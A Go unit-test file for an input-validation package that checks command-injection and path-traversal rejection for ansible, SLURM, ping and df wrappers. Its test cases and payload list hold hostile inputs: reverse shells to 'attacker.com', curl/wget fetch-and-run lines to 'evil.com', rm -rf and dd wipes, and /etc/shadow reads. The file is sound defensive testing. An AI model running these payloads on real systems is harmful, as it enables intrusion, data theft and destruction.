// Package security provides input validation and command injection prevention utilities.
package security

import (
	"math"
	"strings"
	"testing"
)

// =============================================================================
// Executable Validation Tests
// =============================================================================

func TestValidateExecutable(t *testing.T) {
	tests := []struct {
		name     string
		category string
		path     string
		wantErr  bool
	}{
		{
			name:     "valid ansible path",
			category: "ansible",
			path:     "/usr/bin/ansible-playbook",
			wantErr:  false,
		},
		{
			name:     "invalid ansible path",
			category: "ansible",
			path:     "/tmp/malicious/ansible-playbook",
			wantErr:  true,
		},
		{
			name:     "command injection attempt",
			category: "ansible",
			path:     "/usr/bin/ansible-playbook; rm -rf /",
			wantErr:  true,
		},
		{
			name:     "path traversal attempt",
			category: "ansible",
			path:     "/usr/bin/../../../tmp/malicious",
			wantErr:  true,
		},
		{
			name:     "empty path",
			category: "ansible",
			path:     "",
			wantErr:  true,
		},
		{
			name:     "unknown category",
			category: "unknown",
			path:     "/usr/bin/something",
			wantErr:  true,
		},
		{
			name:     "valid sgx path",
			category: "sgx",
			path:     "/usr/bin/gramine-sgx",
			wantErr:  false,
		},
		{
			name:     "valid slurm path",
			category: "slurm",
			path:     "/usr/bin/squeue",
			wantErr:  false,
		},
		{
			name:     "valid system ping",
			category: "system",
			path:     "/usr/bin/ping",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateExecutable(tt.category, tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateExecutable() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Shell Argument Sanitization Tests
// =============================================================================

func TestSanitizeShellArg(t *testing.T) {
	tests := []struct {
		name    string
		arg     string
		wantErr bool
	}{
		{
			name:    "safe alphanumeric",
			arg:     "hello123",
			wantErr: false,
		},
		{
			name:    "safe with dash and underscore",
			arg:     "hello-world_123",
			wantErr: false,
		},
		{
			name:    "safe with dots",
			arg:     "playbook.yml",
			wantErr: false,
		},
		{
			name:    "empty string",
			arg:     "",
			wantErr: false,
		},
		{
			name:    "semicolon injection",
			arg:     "value; rm -rf /",
			wantErr: true,
		},
		{
			name:    "pipe injection",
			arg:     "value | cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "ampersand injection",
			arg:     "value && malicious",
			wantErr: true,
		},
		{
			name:    "backtick injection",
			arg:     "value `id`",
			wantErr: true,
		},
		{
			name:    "dollar expansion",
			arg:     "value $HOME",
			wantErr: true,
		},
		{
			name:    "double quote",
			arg:     `value "quoted"`,
			wantErr: true,
		},
		{
			name:    "single quote",
			arg:     "value 'quoted'",
			wantErr: true,
		},
		{
			name:    "newline injection",
			arg:     "value\nrm -rf /",
			wantErr: true,
		},
		{
			name:    "redirect injection",
			arg:     "value > /etc/passwd",
			wantErr: true,
		},
		{
			name:    "input redirect",
			arg:     "value < /etc/shadow",
			wantErr: true,
		},
		{
			name:    "subshell injection",
			arg:     "value $(id)",
			wantErr: true,
		},
		{
			name:    "curly braces",
			arg:     "value {a,b}",
			wantErr: true,
		},
		{
			name:    "glob wildcard star",
			arg:     "value *",
			wantErr: true,
		},
		{
			name:    "glob wildcard question",
			arg:     "value ?",
			wantErr: true,
		},
		{
			name:    "hash comment",
			arg:     "value # comment",
			wantErr: true,
		},
		{
			name:    "exclamation history",
			arg:     "value !$",
			wantErr: true,
		},
		{
			name:    "tilde expansion",
			arg:     "~/.ssh/id_rsa",
			wantErr: true,
		},
		{
			name:    "too long input",
			arg:     strings.Repeat("a", MaxArgumentLength+1),
			wantErr: true,
		},
		{
			name:    "max length input",
			arg:     strings.Repeat("a", MaxArgumentLength),
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := SanitizeShellArg(tt.arg)
			if (err != nil) != tt.wantErr {
				t.Errorf("SanitizeShellArg() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Path Sanitization Tests
// =============================================================================

func TestSanitizePath(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{
			name:    "simple path",
			path:    "/home/user/file.txt",
			wantErr: false,
		},
		{
			name:    "windows path",
			path:    "C:\\Users\\test\\file.txt",
			wantErr: false,
		},
		{
			name:    "path traversal attack",
			path:    "/home/user/../../../etc/passwd",
			wantErr: true,
		},
		{
			name:    "double dot in middle",
			path:    "/var/log/../secret",
			wantErr: true,
		},
		{
			name:    "empty path",
			path:    "",
			wantErr: true,
		},
		{
			name:    "null byte injection",
			path:    "/home/user/file\x00.txt",
			wantErr: true, // null byte is not in safe characters
		},
		{
			name:    "shell chars in path",
			path:    "/home/user/$(id).txt",
			wantErr: true,
		},
		{
			name:    "semicolon in path",
			path:    "/home/user/file;.txt",
			wantErr: true,
		},
		{
			name:    "too long path",
			path:    "/" + strings.Repeat("a/", MaxPathLength),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := SanitizePath(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("SanitizePath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if !tt.wantErr && got == "" {
				t.Errorf("SanitizePath() returned empty string for valid path %q", tt.path)
			}
		})
	}
}

func TestValidatePlaybookPath(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		allowedDirs []string
		wantErr     bool
	}{
		{
			name:        "valid yaml extension",
			path:        "/playbooks/deploy.yaml",
			allowedDirs: nil,
			wantErr:     false,
		},
		{
			name:        "valid yml extension",
			path:        "/playbooks/deploy.yml",
			allowedDirs: nil,
			wantErr:     false,
		},
		{
			name:        "invalid extension",
			path:        "/playbooks/deploy.txt",
			allowedDirs: nil,
			wantErr:     true,
		},
		{
			name:        "path traversal",
			path:        "/playbooks/../../../etc/passwd.yml",
			allowedDirs: nil,
			wantErr:     true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := ValidatePlaybookPath(tt.path, tt.allowedDirs)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePlaybookPath() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Hostname and IP Validation Tests
// =============================================================================

func TestValidateHostname(t *testing.T) {
	tests := []struct {
		name     string
		hostname string
		wantErr  bool
	}{
		{
			name:     "valid simple hostname",
			hostname: "server1",
			wantErr:  false,
		},
		{
			name:     "valid FQDN",
			hostname: "server1.example.com",
			wantErr:  false,
		},
		{
			name:     "valid with numbers",
			hostname: "server123",
			wantErr:  false,
		},
		{
			name:     "valid with hyphen",
			hostname: "my-server",
			wantErr:  false,
		},
		{
			name:     "empty hostname",
			hostname: "",
			wantErr:  true,
		},
		{
			name:     "starts with hyphen",
			hostname: "-server",
			wantErr:  true,
		},
		{
			name:     "ends with hyphen",
			hostname: "server-",
			wantErr:  true,
		},
		{
			name:     "contains underscore",
			hostname: "my_server",
			wantErr:  true,
		},
		{
			name:     "contains space",
			hostname: "my server",
			wantErr:  true,
		},
		{
			name:     "command injection",
			hostname: "server; rm -rf /",
			wantErr:  true,
		},
		{
			name:     "too long label",
			hostname: strings.Repeat("a", 64),
			wantErr:  true,
		},
		{
			name:     "max label length",
			hostname: strings.Repeat("a", 63),
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateHostname(tt.hostname)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateHostname() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateIPAddress(t *testing.T) {
	tests := []struct {
		name    string
		ip      string
		wantErr bool
	}{
		{
			name:    "valid IPv4",
			ip:      "192.168.1.1",
			wantErr: false,
		},
		{
			name:    "valid IPv4 localhost",
			ip:      "127.0.0.1",
			wantErr: false,
		},
		{
			name:    "valid IPv6",
			ip:      "::1",
			wantErr: false,
		},
		{
			name:    "valid IPv6 full",
			ip:      "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
			wantErr: false,
		},
		{
			name:    "empty IP",
			ip:      "",
			wantErr: true,
		},
		{
			name:    "invalid format",
			ip:      "256.1.1.1",
			wantErr: true,
		},
		{
			name:    "hostname not IP",
			ip:      "example.com",
			wantErr: true,
		},
		{
			name:    "command injection",
			ip:      "192.168.1.1; rm -rf /",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateIPAddress(tt.ip)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateIPAddress() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidatePingTarget(t *testing.T) {
	tests := []struct {
		name    string
		target  string
		wantErr bool
	}{
		{
			name:    "valid hostname",
			target:  "server1.example.com",
			wantErr: false,
		},
		{
			name:    "valid IPv4",
			target:  "192.168.1.1",
			wantErr: false,
		},
		{
			name:    "valid IPv6",
			target:  "::1",
			wantErr: false,
		},
		{
			name:    "empty target",
			target:  "",
			wantErr: true,
		},
		{
			name:    "command injection via semicolon",
			target:  "192.168.1.1; rm -rf /",
			wantErr: true,
		},
		{
			name:    "command injection via pipe",
			target:  "192.168.1.1 | cat /etc/passwd",
			wantErr: true,
		},
		{
			name:    "command injection via backtick",
			target:  "`id`",
			wantErr: true,
		},
		{
			name:    "command injection via dollar",
			target:  "$(whoami)",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePingTarget(tt.target)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePingTarget() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateNodeID(t *testing.T) {
	tests := []struct {
		name    string
		nodeID  string
		wantErr bool
	}{
		{
			name:    "valid simple",
			nodeID:  "node1",
			wantErr: false,
		},
		{
			name:    "valid with hyphen",
			nodeID:  "node-001",
			wantErr: false,
		},
		{
			name:    "valid with underscore",
			nodeID:  "node_001",
			wantErr: false,
		},
		{
			name:    "valid with dot",
			nodeID:  "node.001",
			wantErr: false,
		},
		{
			name:    "empty",
			nodeID:  "",
			wantErr: true,
		},
		{
			name:    "starts with hyphen",
			nodeID:  "-node1",
			wantErr: true,
		},
		{
			name:    "contains space",
			nodeID:  "node 1",
			wantErr: true,
		},
		{
			name:    "command injection",
			nodeID:  "node1; rm -rf /",
			wantErr: true,
		},
		{
			name:    "too long",
			nodeID:  strings.Repeat("a", MaxNodeIDLength+1),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateNodeID(tt.nodeID)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateNodeID() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Integer Conversion Tests
// =============================================================================

func TestSafeUint32ToInt(t *testing.T) {
	tests := []struct {
		name    string
		value   uint32
		wantErr bool
	}{
		{
			name:    "zero",
			value:   0,
			wantErr: false,
		},
		{
			name:    "small value",
			value:   100,
			wantErr: false,
		},
		{
			name:    "max int32",
			value:   math.MaxInt32,
			wantErr: false,
		},
		// Note: On 64-bit systems, MaxUint32 fits in int, so no error
		// On 32-bit systems, values > MaxInt32 would cause error
		{
			name:    "max uint32",
			value:   math.MaxUint32,
			wantErr: false, // OK on 64-bit
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SafeUint32ToInt(tt.value)
			if (err != nil) != tt.wantErr {
				t.Errorf("SafeUint32ToInt() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSafeInt64ToInt(t *testing.T) {
	tests := []struct {
		name    string
		value   int64
		wantErr bool
	}{
		{
			name:    "zero",
			value:   0,
			wantErr: false,
		},
		{
			name:    "negative",
			value:   -100,
			wantErr: false,
		},
		{
			name:    "max int32",
			value:   math.MaxInt32,
			wantErr: false,
		},
		{
			name:    "min int32",
			value:   math.MinInt32,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SafeInt64ToInt(tt.value)
			if (err != nil) != tt.wantErr {
				t.Errorf("SafeInt64ToInt() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSafeIntToInt32(t *testing.T) {
	tests := []struct {
		name    string
		value   int
		want    int32
		wantErr bool
	}{
		{
			name:    "zero",
			value:   0,
			want:    0,
			wantErr: false,
		},
		{
			name:    "max int32",
			value:   math.MaxInt32,
			want:    math.MaxInt32,
			wantErr: false,
		},
		{
			name:    "min int32",
			value:   math.MinInt32,
			want:    math.MinInt32,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := SafeIntToInt32(tt.value)
			if (err != nil) != tt.wantErr {
				t.Errorf("SafeIntToInt32() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if got != tt.want {
				t.Errorf("SafeIntToInt32() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestClampToInt32(t *testing.T) {
	tests := []struct {
		name  string
		value int
		want  int32
	}{
		{
			name:  "zero",
			value: 0,
			want:  0,
		},
		{
			name:  "positive",
			value: 100,
			want:  100,
		},
		{
			name:  "negative",
			value: -100,
			want:  -100,
		},
		{
			name:  "max int32",
			value: math.MaxInt32,
			want:  math.MaxInt32,
		},
		{
			name:  "min int32",
			value: math.MinInt32,
			want:  math.MinInt32,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ClampToInt32(tt.value); got != tt.want {
				t.Errorf("ClampToInt32() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestSafeFloat32ToUint32(t *testing.T) {
	tests := []struct {
		name string
		v    float32
		min  uint32
		max  uint32
		want uint32
	}{
		{
			name: "normal value",
			v:    50.0,
			min:  0,
			max:  100,
			want: 50,
		},
		{
			name: "negative clamped",
			v:    -10.0,
			min:  0,
			max:  100,
			want: 0,
		},
		{
			name: "over max clamped",
			v:    150.0,
			min:  0,
			max:  100,
			want: 100,
		},
		{
			name: "exactly max",
			v:    100.0,
			min:  0,
			max:  100,
			want: 100,
		},
		{
			name: "exactly min",
			v:    0.0,
			min:  0,
			max:  100,
			want: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := SafeFloat32ToUint32(tt.v, tt.min, tt.max); got != tt.want {
				t.Errorf("SafeFloat32ToUint32() = %v, want %v", got, tt.want)
			}
		})
	}
}

// =============================================================================
// Command Argument Builder Tests
// =============================================================================

func TestPingArgs(t *testing.T) {
	tests := []struct {
		name    string
		target  string
		count   int
		wantErr bool
	}{
		{
			name:    "valid IP",
			target:  "192.168.1.1",
			count:   5,
			wantErr: false,
		},
		{
			name:    "valid hostname",
			target:  "example.com",
			count:   3,
			wantErr: false,
		},
		{
			name:    "invalid target injection",
			target:  "192.168.1.1; id",
			count:   1,
			wantErr: true,
		},
		{
			name:    "zero count defaults to 1",
			target:  "192.168.1.1",
			count:   0,
			wantErr: false,
		},
		{
			name:    "negative count defaults to 1",
			target:  "192.168.1.1",
			count:   -5,
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, err := PingArgs(tt.target, tt.count)
			if (err != nil) != tt.wantErr {
				t.Errorf("PingArgs() error = %v, wantErr %v", err, tt.wantErr)
				return
			}
			if !tt.wantErr && len(args) == 0 {
				t.Error("PingArgs() returned empty args for valid input")
			}
		})
	}
}

func TestDfArgs(t *testing.T) {
	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{
			name:    "valid path",
			path:    "/",
			wantErr: false,
		},
		{
			name:    "valid home path",
			path:    "/home/user",
			wantErr: false,
		},
		{
			name:    "path traversal attack",
			path:    "/home/../../../etc",
			wantErr: true,
		},
		{
			name:    "command injection",
			path:    "/; rm -rf /",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := DfArgs(tt.path)
			if (err != nil) != tt.wantErr {
				t.Errorf("DfArgs() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSLURMSqueueArgs(t *testing.T) {
	tests := []struct {
		name    string
		format  string
		user    string
		jobID   string
		wantErr bool
	}{
		{
			name:    "valid format only",
			format:  "%T",
			user:    "",
			jobID:   "",
			wantErr: false,
		},
		{
			name:    "valid all params",
			format:  "%T",
			user:    "testuser",
			jobID:   "12345",
			wantErr: false,
		},
		{
			name:    "injection in format",
			format:  "%T; rm -rf /",
			user:    "",
			jobID:   "",
			wantErr: true,
		},
		{
			name:    "injection in user",
			format:  "",
			user:    "user; id",
			jobID:   "",
			wantErr: true,
		},
		{
			name:    "injection in jobID",
			format:  "",
			user:    "",
			jobID:   "123; id",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SLURMSqueueArgs(tt.format, tt.user, tt.jobID)
			if (err != nil) != tt.wantErr {
				t.Errorf("SLURMSqueueArgs() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSLURMSinfoArgs(t *testing.T) {
	tests := []struct {
		name     string
		format   string
		nodeName string
		wantErr  bool
	}{
		{
			name:     "valid format only",
			format:   "%T",
			nodeName: "",
			wantErr:  false,
		},
		{
			name:     "valid node name",
			format:   "",
			nodeName: "node001.cluster.local",
			wantErr:  false,
		},
		{
			name:     "injection in format",
			format:   "%T | id",
			nodeName: "",
			wantErr:  true,
		},
		{
			name:     "injection in node name",
			format:   "",
			nodeName: "node001; id",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := SLURMSinfoArgs(tt.format, tt.nodeName)
			if (err != nil) != tt.wantErr {
				t.Errorf("SLURMSinfoArgs() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// =============================================================================
// Attack Vector Tests - Comprehensive Security Testing
// =============================================================================

func TestCommandInjectionPayloads(t *testing.T) {
	// Common command injection payloads that should all be rejected
	payloads := []string{
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"$(/bin/sh)",
		"; cat /etc/passwd",
		"| cat /etc/shadow",
		"& ping -c 10 attacker.com",
		"; wget http://evil.com/shell.sh",
		"| curl http://evil.com | sh",
		"&& chmod 777 /etc/passwd",
		"; rm -rf /",
		"| dd if=/dev/zero of=/dev/sda",
		"\n/bin/sh",
		"\r\ncat /etc/passwd",
		"$(touch /tmp/pwned)",
		"`touch /tmp/pwned`",
		"; nc -e /bin/sh attacker.com 4444",
		"| bash -i >& /dev/tcp/attacker/4444 0>&1",
		"${IFS}id",
		"; echo vulnerable > /tmp/vuln",
		"| echo hacked >> /etc/passwd",
		"& nohup ./malware &",
		"'; DROP TABLE users; --",
		"\" OR 1=1 --",
	}

	for _, payload := range payloads {
		t.Run("SanitizeShellArg_"+payload[:min(10, len(payload))], func(t *testing.T) {
			if err := SanitizeShellArg(payload); err == nil {
				t.Errorf("SanitizeShellArg() should reject payload: %q", payload)
			}
		})

		t.Run("ValidatePingTarget_"+payload[:min(10, len(payload))], func(t *testing.T) {
			if err := ValidatePingTarget(payload); err == nil {
				t.Errorf("ValidatePingTarget() should reject payload: %q", payload)
			}
		})
	}
}

func TestPathTraversalPayloads(t *testing.T) {
	// Path traversal payloads that should all be rejected
	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/var/log/../../etc/shadow",
		"C:\\..\\..\\windows\\win.ini",
	}

	for _, payload := range payloads {
		t.Run("SanitizePath_"+payload[:min(15, len(payload))], func(t *testing.T) {
			_, err := SanitizePath(payload)
			if err == nil {
				t.Errorf("SanitizePath() should reject traversal: %q", payload)
			}
		})
	}
}

// TestURLEncodedPayloads tests URL-encoded attacks are blocked by safePathCharacters
func TestURLEncodedPayloads(t *testing.T) {
	payloads := []string{
		"..%2f..%2f..%2fetc/passwd",
		"..%252f..%252f..%252fetc/passwd",
	}

	for _, payload := range payloads {
		t.Run("SanitizePath_"+payload[:min(15, len(payload))], func(t *testing.T) {
			_, err := SanitizePath(payload)
			if err == nil {
				t.Errorf("SanitizePath() should reject URL-encoded traversal: %q", payload)
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
